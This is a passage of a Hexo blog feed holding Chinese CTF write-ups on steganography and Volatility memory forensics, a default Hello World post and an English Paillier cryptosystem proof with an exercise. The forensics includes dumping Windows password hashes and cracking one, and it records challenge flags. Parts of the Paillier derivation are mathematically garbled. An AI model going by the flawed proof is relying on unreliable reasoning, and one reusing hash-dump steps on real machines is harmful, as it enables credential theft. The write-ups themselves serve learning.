class="line">                flag=<span class="number">0</span></span><br><span class="line">         <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
<p>分别对三个文本进行处理，最后2_4没跑出数据，2_8/2_10跑出数据</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817154125683.png" class="" title="image-20220817154125683">
<h2 id="16进制-已知文件头将输出数据转换为压缩包，并解密">16进制/已知文件头将输出数据转换为压缩包，并解密</h2>
<ol>
<li>16进制转换</li>
</ol>
<blockquote>
<p><a href="https://the-x.cn/encodings/Hex.aspx">https://the-x.cn/encodings/Hex.aspx</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817154843391.png" class="" title="image-20220817154843391">
<ol start="2">
<li>winhex</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817155055041.png" class="" title="image-20220817155055041">
<ol start="3">
<li>生成压缩包后，解压，使用所得密钥<code>35c535765e50074a</code>进行解密，得到<code>flag&#123;20de17cc-d2c1-4b61-bebd-41159ed7172d&#125;</code></li>
</ol>
<h1>[国赛]pikalang</h1>
<ol>
<li><code>stegsolve</code>对<code>pika.png</code>进行通道检查</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220921101021224.png" class="" title="image-20220921101021224">
<ol start="2">
<li>提取出来的数据进行base64解密，得到<code>pikalang</code>密文</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220921101119449.png" class="" title="image-20220921101119449">
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgcGlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>引入第三方库<code>pikalang</code>，最后使用pokeball编写脚本</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import pikalang</span></span><br><span class="line"></span><br><span class="line">sourcecode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or use sourcecode = pikalang.load_source(&quot;pika.pokeball&quot;) to load from file</span></span><br><span class="line"></span><br><span class="line">pikalang.evaluate(sourcecode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>[网鼎杯 2020 青龙组]虚幻2</h1>
<blockquote>
<p>解压缩得到<code>file </code></p>
<p>tools：</p>
<ol>
<li>winhex</li>
<li>中国编码APP</li>
<li>pycharm</li>
</ol>
<p>hint：</p>
<ol>
<li>汉信码</li>
<li>爆破</li>
</ol>
</blockquote>
<ol>
<li>使用<code>winhex</code>发现文件头是PNG，所以把后缀名修改，得到<code>file.png</code></li>
<li>将<code>file.png</code>进行读取，得到<code>01</code>字符串</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读取像素点</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">36</span>	  <span class="comment">#x坐标</span></span><br><span class="line">y = <span class="number">12</span>	  <span class="comment">#y坐标</span></span><br><span class="line"></span><br><span class="line">im=Image.<span class="built_in">open</span>(<span class="string">&#x27;file.png&#x27;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#im.show()</span></span><br><span class="line">z=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        rgb=im.getpixel((i, j))</span><br><span class="line">        <span class="built_in">print</span>(rgb)</span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">0</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">0</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">1</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">1</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(rgb[<span class="number">2</span>]==<span class="number">0</span>):</span><br><span class="line">            z+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(rgb[<span class="number">2</span>]==<span class="number">255</span>):</span><br><span class="line">            z+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line">file.write(z)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>将<code>01</code>字符串写入图片，得到缺失一块的汉信码。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写入成为图片</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">36</span>	  <span class="comment">#x坐标</span></span><br><span class="line">y = <span class="number">36</span>	  <span class="comment">#y坐标</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a=file.read()</span><br><span class="line">z=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">		<span class="built_in">print</span>(a[z])</span><br><span class="line">		<span class="keyword">if</span>(a[z]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">			im.putpixel((i, j), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">		<span class="keyword">elif</span>(a[z]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">			im.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		z=z+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">&#x27;Hanxin.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825161005347.png" class="" title="image-20220825161005347">
<ol start="4">
<li>稍微补充点，然后让汉信码自动校正。得到<code>flag&#123;eed70c7d-e530-49ba-ad45-80fdb7872e0a&#125;</code></li>
</ol>
<h1>电子数据取证-Volatility</h1>
<h2 id="1-Suspicion">1. Suspicion</h2>
<blockquote>
<p>解压缩得到mem.vmem suspious</p>
<p>tools：</p>
<ol>
<li><a href="http://vol.py">vol.py</a></li>
<li>Elcomsoft Forensic Disk Decryptor（EFDD）</li>
</ol>
</blockquote>
<ol>
<li>通过<code>vol.py -f mem.vmem imageinfo</code>获得基本信息</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220822164245671.png" class="" title="image-20220822164245671">
<ol start="2">
<li>通过<code>vol.py -f mem.vmem --profile=WinXPSP2x86 pstree</code>，得到加密进程<code>TrueCrypt.exe</code>，推断<code>suspious</code>是加密后的数据</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220822164457784.png" class="" title="image-20220822164457784">
<ol start="3">
<li>通过<code>vol.py -f mem.vmem --profile=WinXPSP2x86 memdump -p 2012 -D ./</code>（-p为PID，-D是转储路径）</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825135521302.png" class="" title="image-20220825135521302">
<ol start="4">
<li>使用<code>EFDD</code>对<code>2012.dmp</code>进行解密以及挂载。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140011253.png" class="" title="image-20220825140011253">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140028921.png" class="" title="image-20220825140028921">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140238242.png" class="" title="image-20220825140238242">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140342485.png" class="" title="image-20220825140342485">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140421572.png" class="" title="image-20220825140421572">
<p>进行挂载操作。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140704331.png" class="" title="image-20220825140704331">
<ol start="5">
<li>查看挂载后的数据，找到<code>PCTF&#123;T2reCrypt_15_N07_S3cu2e&#125;</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140814805.png" class="" title="image-20220825140814805">
<h2 id="2-湖湘杯2020-passwd">2. [湖湘杯2020] passwd</h2>
<blockquote>
<p>解压缩得到<code>WIN-BU6IJ7FI9RU-20190927-152050.raw</code></p>
<p>MD5解密</p>
</blockquote>
<ol>
<li>依旧查看基本信息<code>vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142251600.png" class="" title="image-20220825142251600">
<ol start="2">
<li>查看hash值<code>vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142421951.png" class="" title="image-20220825142421951">
<ol start="3">
<li>使用MD5网站进行解密，得到<code>qwer1234</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142616849.png" class="" title="image-20220825142616849">
<h2 id="3-NEWSCTF2021-very-ez-dump">3. [NEWSCTF2021] very-ez-dump</h2>
<blockquote>
<p>解压缩得到<code>mem.raw</code></p>
</blockquote>
<ol>
<li>查看镜像信息<code>vol.py -f mem.raw imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143021996.png" class="" title="image-20220825143021996">
<ol start="2">
<li>查看cmd所执行的相关命令，发现添加了一个用户<code>mumuzi</code>且密码为<code>(ljmmz)ovo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143310111.png" class="" title="image-20220825143310111">
<ol start="3">
<li>查找flag关键词<code>vol.py -f mem.raw --profile=Win7SP1x64 filescan | grep flag</code>，发现<code>flag.zip</code>进行转储<code>vol.py -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D ./</code>（-Q为地址，-D为转储路径）</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143446485.png" class="" title="image-20220825143446485">
<ol start="4">
<li>用<code>winhex</code>发现应该是<code>zip</code>，修改后缀名，发现压缩包进行真加密，并且需要相应的密码。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143834446.png" class="" title="image-20220825143834446">
<ol start="5">
<li>用2中得到的密码对压缩包进行解密，最后解密得到<code>flag&#123;ez_di_imp_1t_y0u_like?&#125;</code></li>
</ol>
<h2 id="5-HDCTF2019-你能发现什么蛛丝马迹吗">5. [HDCTF2019]你能发现什么蛛丝马迹吗</h2>
<blockquote>
<p>解压缩得到<code>memory.img</code></p>
<p>tools：</p>
<ol>
<li>volatility</li>
</ol>
</blockquote>
<ol>
<li>正常流程，先看具体里面内容<code>vol.py -f memory.img imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825103409801.png" class="" title="image-20220825103409801">
<p>主要使用了<code>Win2003SP</code>，根据尝试，发现<code>Win2003SP0x86</code>无法读取相关的数据，所以主要选择<code>Win2003SP1x86</code>等进行内存取证。</p>
<ol start="2">
<li>使用<code>vol.py -f memory.img --profile=Win2003SP1x86 sptree</code>查看进程。发现两个可疑进程<code>ctfmoon.exe</code>和<code>DumpIt.exe</code>,<code>ctfmoon.exe</code>进程相对久远，优先查看<code>DumpIt.exe</code>。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825104239959.png" class="" title="image-20220825104239959">
<p><code>DumpIt.exe</code>主要是用来内存取证的工具，那主要的思路就是查看它主要做了哪些工作。</p>
<ol start="3">
<li>使用<code>screenshot</code>查看<code>vol.py -f memory.img --profile=Win2003SP1x86 screenshot --dump-dir=./</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825111632586.png" class="" title="image-20220825111632586">
<ol start="4">
<li>发现了<code>flag.png</code>，此时主要查找相关的flag<code>vol.py -f memory.img --profile=Win2003SP1x86 filescan | grep flag </code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825111809842.png" class="" title="image-20220825111809842">
<ol start="5">
<li><code>vol.py -f memory.img --profile=Win2003SP1x86 dumpfiles -Q 0x000000000484f900 -D ./ -u</code></li>
</ol>
<p>把<code>flag</code>相关给导入数据，最后得到<code>00.dat</code>。</p>
<p>二维码扫一扫发现一段疑似<code>base64</code>密文。但解密没得到有用数据，于是继续从别的渠道查看。</p>
<ol start="6">
<li>查看打开了哪些软件以及具体操作<code>vol.py -f memory.img --profile=Win2003SP1x86 windows</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825132746976.png" class="" title="image-20220825132746976">
<p>Pid:1992，使用图片和传真查看器查看了<code>flag.png</code>。</p>
<ol start="7">
<li>
<p>然后我们把这些相关数据给导出<code> vol.py -f memory.img --profile=Win2003SP1x86 memdump -p 1992 -D ./</code>，从而得到<code>1992.dmp</code></p>
</li>
<li>
<p>我们得到<code>1992.dmp</code>后，利用<code>foremost 1992.dmp</code>把隐藏其中的相关数据给导出</p>
</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133104198.png" class="" title="image-20220825133104198">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133126952.png" class="" title="image-20220825133126952">
<p>里面发现这些图片。</p>
<p>二维码就是之前分离出来的，扫出来是<code>jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</code>，而另一张图显示<code>key:Th1s_1s_K3y00000</code>以及<code>iv:1234567890123456</code>。出现IV+密文也是base64形式。所以考虑是否进行了AES加密。</p>
<ol start="9">
<li>对密文进行AES解密，因为告诉了IV所以主要考虑是不是除了ECB以外的模式，但最终其实就是ECB模式的AES解密。（所以这一步很迷，给的IV难道就只是提示AES？）</li>
</ol>
<blockquote>
<p>AES解密：<a href="http://tool.chacuo.net/cryptaes">在线AES加密解密、AES在线加密解密、AES encryption and decryption–查错网 (chacuo.net)</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133644181.png" class="" title="image-20220825133644181">
<p>最后得到密文<code>flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</code></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/10/21/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="Quick-Start">Quick Start</h2>
<h3 id="Create-a-new-post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Paillier-Cryptosystem</title>
    <url>/2023/03/15/paillier-cryptosystem/</url>
    <content><![CDATA[<p>Two different approaches to homomorphic encryption. These ways are called as “paillier-cryptosystem”.</p>
<p>And to understand the principle behind them, I do the proof.</p>
<span id="more"></span><!--toc-->
<h1>INIT</h1>
<h2 id="FIRST-PATTERN">FIRST PATTERN</h2>
<ul>
<li>
<p>produce two large primes $p$, $q$, assert them that $gcd(p\times q, (p-1)\times(q-1) = 1$</p>
</li>
<li>
<p>calculate $n = p\times q$, define that $\lambda = lcm(p-1, q-1) = \frac{(p-1)\times(q-1)}{gcd(p-1, q-1)}$</p>
</li>
<li>
<p>produce random $g$, and $0&lt;g&lt;n^{2}$</p>
</li>
<li>
<p>define that $L(x) = \frac{x-1}{n}$</p>
</li>
<li>
<p>define that $\mu = (L(g^{\lambda} \mod n^{2}))^{-1} \mod n$</p>
</li>
</ul>
<h2 id="SECOND-PATTERN">SECOND PATTERN</h2>
<ul>
<li>
<p>define that $g = n  + 1$</p>
</li>
<li>
<p>define that $\lambda = \varphi(n) = (p-1)\times (q-1) $</p>
</li>
<li>
<p>and also define that $\mu = \varphi(n)^{-1} \mod n$</p>
</li>
</ul>
<h1>KEYS</h1>
<ul>
<li>PK = {$n$, $g$}</li>
<li>SK = {$\lambda$, $\mu$}</li>
</ul>
<h1>ENCRYPT AND DECRYPT</h1>
<h2 id="ENCRYPT">ENCRYPT</h2>
<ul>
<li>assert that $0&lt;m&lt;n$</li>
<li>produce a random $r$, assert that $gcd(r, n) = 1$</li>
<li>$c \equiv g^{m} \cdot r^{n} \mod n^{2}$</li>
</ul>
<h2 id="DECRYPT">DECRYPT</h2>
<ul>
<li>$m \equiv (L(c^{\lambda} \mod n^{2})\cdot \mu)\mod n$</li>
</ul>
<h1>PROOF</h1>
<h2 id="PATTERN-1">PATTERN 1</h2>
<ul>
<li>substitute the equation of $c$ into $m$, we get the $eq1$</li>
</ul>
<p>$$<br>
m \equiv (L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2})\cdot \mu)\mod n<br>
$$ {eq1}</p>
<ul>
<li>substitute $\mu$ to ${eq1}$, we get the $eq2$</li>
</ul>
<p>$$<br>
m \equiv L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2}) \cdot (L(g^{\lambda} \mod n^{2}))^{-1} \mod n<br>
$$ {eq2}</p>
<ul>
<li>make some deductions to get the $g^{\lambda}$</li>
</ul>
<p>$$<br>
p-1 | \lambda and  q-1 | \lambda<br>
$$</p>
<p>so  we can get the equations that:<br>
$$<br>
\lambda = k_1(p-1) and \lambda = k_2(q-1)<br>
$$<br>
fermat little theorem:<br>
$$<br>
g^{\lambda} = g^{k_1(p-1)} \equiv 1 \mod p<br>
$$</p>
<p>$$<br>
g^{\lambda} = g^{k_2(q-1)} \equiv 1 \mod q<br>
$$</p>
<p>$$<br>
\Longrightarrow g^{\lambda} - 1 | q and g^{\lambda} - 1 | p<br>
$$</p>
<p>$$<br>
\Longrightarrow g^{\lambda} - 1 | lcm(p, q)<br>
$$</p>
<p>$$<br>
\Longrightarrow g^{\lambda} - 1 | n<br>
$$</p>
<p>at last, we get the key equation:<br>
$$<br>
g^{\lambda} \equiv 1 \mod n<br>
$$</p>
<p>$$<br>
\Longrightarrow g^{\lambda} \mod n^{2} \equiv  1 \mod n<br>
$$</p>
<p>$$<br>
\Longrightarrow g^{\lambda} = 1 + k_g \cdot n<br>
$$</p>
<p>the $k_g$ is less than $n$</p>
<p>substitute $g^{\lambda}$ into $L(x)$:<br>
$$<br>
L(g^{\lambda} \mod n^{2}) = k_g<br>
$$</p>
<ul>
<li>also make some deductions to get $g^{m\lambda}$</li>
</ul>
<p>$$<br>
1 + kn \equiv 1 + kn \mod n^{2}<br>
$$</p>
<p>$$<br>
(1 + kn)^{2} \equiv 1 + 2kn + (kn)^{2} \mod n^{2} \equiv 1 + 2kn \mod n^{2}<br>
$$</p>
<p>$$<br>
(1 + kn)^{3} \equiv 1 + 3kn + 3(kn)^{2} + (kn)^{3} \equiv 1+3kn \mod n^{2}<br>
$$</p>
<p>$$<br>
\Longrightarrow (1 + kn)^{m}\equiv 1+mkn \mod n^{2}<br>
$$</p>
<p>$$<br>
\Longrightarrow g^{m\lambda}=(1+k_gn)^{m}\equiv 1 + mk_gn \mod n^{2}<br>
$$</p>
<ul>
<li>same to get $r^{n\lambda}$</li>
</ul>
<p>$$<br>
r^{n\lambda} =(1+k_rn)^{n}\equiv 1 + k_r n^{2} \mod n^{2} \equiv 1\mod n^{2}<br>
$$</p>
<ul>
<li>substitute $g^{m\lambda}$ , $r^{n\lambda}$ and $L(g^{\lambda} \mod n^{2})$ into $eq2$</li>
</ul>
<p>$$<br>
m \equiv L(1 + mk_gn \mod n^{2}) \cdot (L(g^{\lambda} \mod n^{2}))^{-1} \mod n<br>
$$</p>
<p>$$<br>
m \equiv k_g m \cdot k_g^{-1} \mod n \equiv m \mod n<br>
$$</p>
<p><strong>Proved.</strong></p>
<h2 id="PATTERN-2">PATTERN 2</h2>
<ul>
<li>also substitute $c$ into $m$</li>
</ul>
<p>$$<br>
L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2})\cdot \mu \mod n<br>
$$</p>
<ul>
<li>substitute $\lambda$ into $r^{n\lambda}$ and make some deductions</li>
</ul>
<p>$$<br>
r^{n\lambda} = r^{n(p-1)(q-1)} = r^{p(p-1) \cdot q(q-1)}<br>
$$</p>
<p>using Euler’s totient function 3 that $\varphi(p^k) = p^k - p^{k-1} = (p-1)\cdot p^{k-1} = \varphi§ \cdot p^{k-1}$ and fermat little theorem<br>
$$<br>
r^{p(p-1) \cdot q(q-1)} = r^{\varphi(n^2)} \equiv 1 \mod n^{2}<br>
$$</p>
<p>$$<br>
r^{n\lambda} \equiv 1 \mod n^{2}<br>
$$</p>
<ul>
<li>get the simple equation, we get the $eq3$</li>
</ul>
<p>$$<br>
(L(g^{m\lambda} \mod n^{2})\cdot \mu) \mod n<br>
$$ {eq3}</p>
<ul>
<li>make some deductions about $g^{m\lambda}$</li>
</ul>
<p>$$<br>
g^{m\lambda} \equiv (n + 1)^{m\lambda} \mod n^{2}<br>
$$</p>
<p>$$<br>
\Longrightarrow g^{m\lambda} \equiv 1 + mn\lambda \mod n^{2}<br>
$$</p>
<ul>
<li>substitute $g^{m\lambda}$ into $eq3$</li>
</ul>
<p>$$<br>
L(1 + mn\lambda)\cdot \mu \mod n \equiv m\lambda \mu \mod n<br>
$$</p>
<p>as $\lambda = (p-1)(q-1) = \varphi(n)$ and $\mu \equiv \varphi(n)^{-1}\mod n$, we will get that:<br>
$$<br>
m \varphi(n)\cdot \varphi(n)^{-1} \equiv m \mod n<br>
$$<br>
<strong>Proved.</strong></p>
<h1>EXERCISE</h1>
<h2 id="FIRST">FIRST</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line"><span class="keyword">assert</span> gcd(p*q, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)) == <span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">g = random.randint(<span class="number">1</span>, n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g = &#x27;</span> + <span class="built_in">str</span>(g))</span><br><span class="line">r = random.randint(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> gcd(r, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = (<span class="built_in">pow</span>(g, m, n*n) * <span class="built_in">pow</span>(r, n, n*n)) % (n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n, g, c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="SECOND">SECOND</h2>
